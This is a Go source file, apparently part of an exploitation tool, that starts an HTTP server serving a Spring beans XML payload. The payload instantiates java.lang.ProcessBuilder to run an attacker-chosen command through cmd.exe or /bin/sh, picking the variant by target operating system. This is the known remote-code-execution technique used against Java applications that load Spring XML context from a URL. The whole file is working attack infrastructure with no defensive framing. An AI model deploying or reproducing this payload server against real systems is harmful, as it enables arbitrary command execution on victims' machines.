package conn

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

var (
	winPayload = `<beans xmlns="http://www.springframework.org/schema/beans"
			    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
			    xsi:schemaLocation="http://www.springframework.org/schema/beans
			    http://www.springframework.org/schema/beans/spring-beans.xsd">
	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
		<constructor-arg>
			<list>
				<value>cmd.exe</value>
				<value>/c</value>
				<value>{{cmd}}</value>
			</list>
		</constructor-arg>
	</bean>
</beans>`
	linuxPayload = `<beans xmlns="http://www.springframework.org/schema/beans"
				  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
				  xsi:schemaLocation="http://www.springframework.org/schema/beans
				  http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>/bin/sh</value>
                <value>-c</value>
                <value>{{cmd}}</value>
            </list>
        </constructor-arg>
    </bean>
</beans>`

	command    string
	Xmlpayload string
	server     *http.Server
)

func newXmlHandler(targetOS, cmd string) http.Handler {
	command = cmd
	if strings.Contains(strings.ToLower(targetOS), "windows") {
		Xmlpayload = winPayload
	} else {
		Xmlpayload = linuxPayload
	}

	return http.HandlerFunc(XmlRequest)
}

func XmlRequest(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/xml")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusOK)

	xml := strings.Replace(Xmlpayload, "{{cmd}}", command, 1)
	io.WriteString(w, xml)
}

func stop() {
	if server != nil {
		err := server.Shutdown(nil)
		if err != nil {
			fmt.Println("Failed to stop server:", err)
		}
	}
}

func start(host string, port int, targetOS, cmd, path string) {
	mux := http.NewServeMux()
	mux.Handle(path, newXmlHandler(targetOS, cmd))

	server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", host, port),
		Handler: mux,
	}

	go func() {
		err := server.ListenAndServe()
		if err != nil && err != http.ErrServerClosed {
			log.Fatal("Failed to start server:", err)
		}
	}()

	log.Print("server started on port:", port)

	// Handle graceful shutdown
	stopChan := make(chan os.Signal, 1)
	signal.Notify(stopChan, syscall.SIGINT, syscall.SIGTERM)
	<-stopChan

	stop()
}
